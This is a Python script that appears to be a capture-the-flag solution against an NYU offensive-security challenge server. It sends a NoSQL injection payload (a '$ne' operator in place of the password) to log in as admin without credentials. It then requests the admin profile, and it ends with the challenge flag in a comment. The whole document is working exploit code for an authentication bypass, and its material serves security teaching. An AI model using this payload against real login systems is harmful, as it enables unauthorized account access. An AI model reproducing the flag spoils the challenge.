import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:10001'
headers = {"Content-Type": "application/json"}

session = requests.Session()
session.headers.update(headers)

print("[*] Sending login POST request...")
data = {
    'username': "admin",
    'password': {"$ne": ""}
}
response_login = session.post(f'{url}/api/login', json=data)
if response_login.status_code == 200:
    print("[+] Login request succeeded!")
    print("[+] Response JSON Data:", response_login.json())

print("[*] Sending profile GET request for user 'admin'...")
response_profile = session.get(f'{url}/api/profile?username=admin')
if response_profile.status_code == 200:
    print("[+] Profile request succeeded!")
    print("[+] Profile JSON Data:", response_profile.json())

# flag{y0u_h4v3_n0w_4cc3ss_t0_nucl34r_w34p0n_0000000000000000}
